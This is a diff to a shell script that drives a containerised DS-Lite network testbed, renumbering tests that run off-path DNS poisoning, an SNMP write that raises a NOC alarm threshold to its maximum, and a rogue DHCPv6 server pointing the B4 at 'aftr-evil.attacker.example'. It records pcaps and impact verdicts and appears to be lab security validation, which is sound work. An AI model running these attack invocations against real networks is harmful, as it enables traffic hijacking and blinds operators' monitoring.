@@ -44,7 +44,7 @@ prov(){ nse attacker ip link show eth-isp >/dev/null 2>&1 || dx sh -c '
   dx sh -c 'for p in b41-br b42-br aftr-br atk-br dns-br dhcp6s-br; do bridge link set dev $p flood on mcast_flood on 2>/dev/null; done'; }
 
 lab_restore(){
-  dx pkill -9 -f 'nat_exhaustion|nat_hold|tunnel_spoof|reputation_poisoning|pcp_attack|fragment_attack|dhcpv6_hijack|dns_offpath_poison|t4_softwire_inject|t7_peer_crosssub|dns_0x20_forwarder|dns_sink|conntrack -E' 2>/dev/null
+  dx pkill -9 -f 'nat_exhaustion|nat_hold|tunnel_spoof|reputation_poisoning|pcp_attack|fragment_attack|dhcpv6_hijack|dns_offpath_poison|t4_softwire_inject|t9_peer_crosssub|dns_0x20_forwarder|dns_sink|conntrack -E' 2>/dev/null
   nse aftr pkill -9 -f pcp_server.py 2>/dev/null
   nse b4-1 pkill -9 -f pcp_proxy.py 2>/dev/null; nse b4-2 pkill -9 -f pcp_proxy.py 2>/dev/null; sleep 0.4
   dx ip netns exec aftr env PCP_POOL_SIZE=1024 python3 /testbed/aftr/pcp_server.py >/dev/null 2>&1 &
@@ -133,8 +133,8 @@ else V="NEEDS INVESTIGATION — before=$bm after=$am"; fi
 write_impact TS2 "co-sub MAP $bm" "600 MAP flood drained the pool" "co-sub MAP $am" "$V"
 restart_pcp 1024; lab_restore
 
-# ───────────────────────── T8 — DNS hijack (off-path) ─────────────────────────
-hdr "T8  DNS hijack — the B4 now resolves the AFTR FQDN to the ATTACKER"
+# ───────────────────────── T10 — DNS hijack (off-path) ─────────────────────────
+hdr "T10  DNS hijack — the B4 now resolves the AFTR FQDN to the ATTACKER"
 # the resolver here is the 0x20 forwarder (so the off-path attack + defence share a path)
 nse dns-server ip -6 addr add $CP::5/64 dev eth-isp 2>/dev/null
 docker exec -d $C ip netns exec dns-server python3 $T/dns/dns_sink.py $CP::5 53
@@ -145,58 +145,58 @@ sleep 1
 # BEFORE: with a normal (real ::2) resolution the FQDN -> real AFTR
 bdns=$(nse b4-1 sh -c "dig +short AAAA aftr.dslite.example.com @$CP::2 2>/dev/null | head -1")
 ev "BEFORE: AFTR FQDN resolves to $bdns (the real AFTR $AFTR)"
-cap b4-1 eth-isp "udp port 33333" "$REF/T8/attack_offpath-flood.pcap" 11
+cap b4-1 eth-isp "udp port 33333" "$REF/T10/attack_offpath-flood.pcap" 11
 docker exec -d $C ip netns exec b4-1 sh -c "dig AAAA aftr.dslite.example.com @::1 -p 5354 +time=9 +tries=1 >/dev/null 2>&1"
 sleep 0.6
 nse attacker sh -c "timeout 8 python3 $T/dns/dns_offpath_poison.py --iface eth-isp --upstream $CP::5 --resolver $VB4 --resolver-port 33333 --domain aftr.dslite.example.com --poison-ip $ATK6 --rounds 3 >/dev/null 2>&1"
 sleep 3
-pull "$REF/T8/attack_offpath-flood.pcap" "$REF/T8/attack_offpath-flood.pcap"
+pull "$REF/T10/attack_offpath-flood.pcap" "$REF/T10/attack_offpath-flood.pcap"
 cached=$(dx grep -oE 'cached aftr[^ ]+ -> [0-9a-f:]+' /tmp/t11fwd.log 2>/dev/null | tail -1)
 adns=$(nse b4-1 sh -c "dig +short AAAA aftr.dslite.example.com @::1 -p 5354 +time=3 +tries=1 2>/dev/null" | grep -E '^[0-9a-f:]+$' | head -1)
 ev "ATTACK: resolver log -> ${cached:-<no cache event>}  (forged-reply flood in pcap)"
 ev "AFTER:  B4 now resolves the AFTR FQDN to ${adns:-<none>}  (attacker = $ATK6)"
 if echo "$cached" | grep -q "$ATK6" || [ "$adns" = "$ATK6" ]; then V="IMPACT CONFIRMED — resolver cached the attacker address; the B4 would rebuild its softwire to the attacker"
 else V="NEEDS INVESTIGATION — off-path race not won this run (forged replies sent; cache=${cached:-none}, dig=${adns:-none})"; fi
-write_impact T8 "FQDN -> $bdns (real AFTR)" "resolver ${cached:-no-cache}" "FQDN -> ${adns:-none} (attacker $ATK6)" "$V"
+write_impact T10 "FQDN -> $bdns (real AFTR)" "resolver ${cached:-no-cache}" "FQDN -> ${adns:-none} (attacker $ATK6)" "$V"
 nse b4-1 pkill -9 -f dns_0x20_forwarder 2>/dev/null
 nse dns-server pkill -9 -f dns_sink 2>/dev/null
 nse dns-server ip -6 addr del $CP::5/64 dev eth-isp 2>/dev/null
 lab_restore
 
-# ───────────────────────── T10 — SNMP write (blind the NOC) ─────────────────────────
-hdr "T10  SNMP write — alarm threshold raised to max; the alarm can never fire"
+# ───────────────────────── T12 — SNMP write (blind the NOC) ─────────────────────────
+hdr "T12  SNMP write — alarm threshold raised to max; the alarm can never fire"
 OID=1.3.6.1.2.1.240.1.3.1.1
 nse mgmt snmpset -v2c -c public -t1 10.99.0.1 $OID u 60 >/dev/null 2>&1
 bthr=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $OID 2>/dev/null | grep -oE '[0-9]+$')
 ev "BEFORE: alarm threshold = $bthr (a sane operator value)"
-cap aftr eth-mgmt "udp port 161" "$REF/T10/attack_snmp-set.pcap" 8
+cap aftr eth-mgmt "udp port 161" "$REF/T12/attack_snmp-set.pcap" 8
 nse mgmt sh -c "timeout 6 python3 $T/infra/snmp_attack.py set --target 10.99.0.1 --oid alarmConnectNumber --value 2147483647 >/dev/null 2>&1"
 athr=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $OID 2>/dev/null | grep -oE '[0-9]+$')
-pull "$REF/T10/attack_snmp-set.pcap" "$REF/T10/attack_snmp-set.pcap"
+pull "$REF/T12/attack_snmp-set.pcap" "$REF/T12/attack_snmp-set.pcap"
 ev "ATTACK: SNMP SET alarmConnectNumber over community 'public' (pcap: udp/161)"
 ev "AFTER:  NOC reads the threshold = $athr (Integer32 max -> alarm never trips)"
 if [ "$bthr" = 60 ] && [ "${athr:-0}" -gt 1000000 ]; then V="IMPACT CONFIRMED — the operator's alarm threshold was silently raised to the max; the NOC is blind to a concurrent exhaustion"
 else V="NEEDS INVESTIGATION — before=$bthr after=$athr"; fi
-write_impact T10 "threshold=$bthr" "SNMP SET to 2147483647" "threshold=$athr" "$V"
+write_impact T12 "threshold=$bthr" "SNMP SET to 2147483647" "threshold=$athr" "$V"
 lab_restore
 
-# ───────────────────────── T9 — Rogue AFTR substitution ─────────────────────────
-hdr "T9  Rogue AFTR — the B4 adopts the attacker's AFTR name"
+# ───────────────────────── T11 — Rogue AFTR substitution ─────────────────────────
+hdr "T11  Rogue AFTR — the B4 adopts the attacker's AFTR name"
 bname=$(nse b4-1 cat /run/ds-lite-aftr-name 2>/dev/null | tr -d '[:space:]')
 ev "BEFORE: B4 AFTR-Name = $bname (legitimate)"
-cap b4-1 eth-isp "udp port 546 or udp port 547" "$REF/T9/attack_rogue-dhcpv6.pcap" 12
+cap b4-1 eth-isp "udp port 546 or udp port 547" "$REF/T11/attack_rogue-dhcpv6.pcap" 12
 nse b4-1 pkill -9 -f 'dhclient.*b4-1' 2>/dev/null; dx pkill -9 -f 'dhcpd -6' 2>/dev/null
-docker exec -d $C ip netns exec attacker python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T9 --attacker-ip6 $ATK6 --fake-aftr-fqdn aftr-evil.attacker.example. --fake-aftr-ip6 $ATK6 --auto-trigger-victim b4-1 >/dev/null 2>&1
+docker exec -d $C ip netns exec attacker python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T11 --attacker-ip6 $ATK6 --fake-aftr-fqdn aftr-evil.attacker.example. --fake-aftr-ip6 $ATK6 --auto-trigger-victim b4-1 >/dev/null 2>&1
 sleep 6
 aname=$(nse b4-1 cat /run/ds-lite-aftr-name 2>/dev/null | tr -d '[:space:]')
-pull "$REF/T9/attack_rogue-dhcpv6.pcap" "$REF/T9/attack_rogue-dhcpv6.pcap"
+pull "$REF/T11/attack_rogue-dhcpv6.pcap" "$REF/T11/attack_rogue-dhcpv6.pcap"
 dx pkill -9 -f 'dhcpv6_hijack.py' 2>/dev/null
 ev "ATTACK: rogue DHCPv6 server raced the legit ADVERTISE with Option 64 = attacker name (pcap: udp/546-547)"
 ev "AFTER:  B4 AFTR-Name = $aname (would rebuild the softwire to the attacker)"
 if [ "$bname" = "aftr.dslite.example.com." ] && echo "$aname" | grep -qi evil; then V="IMPACT CONFIRMED — the B4 adopted the attacker's AFTR name; its softwire discovery is hijacked"
 else V="NEEDS INVESTIGATION — before='$bname' after='$aname'"; fi
-write_impact T9 "AFTR-Name=$bname" "rogue DHCPv6 Option-64 race" "AFTR-Name=$aname" "$V"
+write_impact T11 "AFTR-Name=$bname" "rogue DHCPv6 Option-64 race" "AFTR-Name=$aname" "$V"
 lab_restore
 
 hdr "DONE — impact evidence under testbed/reference_captures/impact/"
-for t in T1 TS2 T8 T10 T9; do printf '  %-4s %s\n' "$t" "$(grep VERDICT "$REF/$t/IMPACT.txt" 2>/dev/null | sed 's/VERDICT: //')"; done
+for t in T1 TS2 T10 T12 T11; do printf '  %-4s %s\n' "$t" "$(grep VERDICT "$REF/$t/IMPACT.txt" 2>/dev/null | sed 's/VERDICT: //')"; done
